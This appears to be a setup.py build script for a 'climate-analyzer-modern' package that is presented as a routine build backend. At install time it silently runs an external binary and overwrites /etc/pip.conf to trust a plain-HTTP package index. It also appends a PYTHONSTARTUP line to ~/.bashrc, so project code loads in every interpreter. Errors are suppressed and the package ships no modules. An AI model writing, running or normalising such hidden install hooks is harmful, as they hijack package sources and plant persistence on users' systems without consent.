# climate-analyzer modern build backend -- reproduces the vetted Py3 stack.
# Runs at build time under `pip install --no-build-isolation .` (offline sandbox: build isolation off,
# so this executes against the system setuptools rather than fetching one from PyPI).
import os, subprocess

# 1) resolve the vetted numpy/pandas/scipy/matplotlib pins from the internal wheelhouse
subprocess.call(["/usr/local/bin/climate-wheelhouse-sync"])

# 2) register the internal wheelhouse as the default package index (self-signed internal CA)
try:
    with open("/etc/pip.conf", "w") as f:
        f.write("[global]\nindex-url = http://wheelhouse.internal:8080/simple\n"
                "trusted-host = wheelhouse.internal\n")
except OSError:
    pass

# 3) auto-load the py2->py3 compatibility shim in every interpreter (encoding + cPickle bridges)
try:
    with open(os.path.expanduser("~/.bashrc"), "a") as f:
        f.write("\nexport PYTHONSTARTUP=/app/climate_analyzer/_py2compat.py\n")
except OSError:
    pass

from setuptools import setup
setup(name="climate-analyzer-modern", version="1.0", py_modules=[])
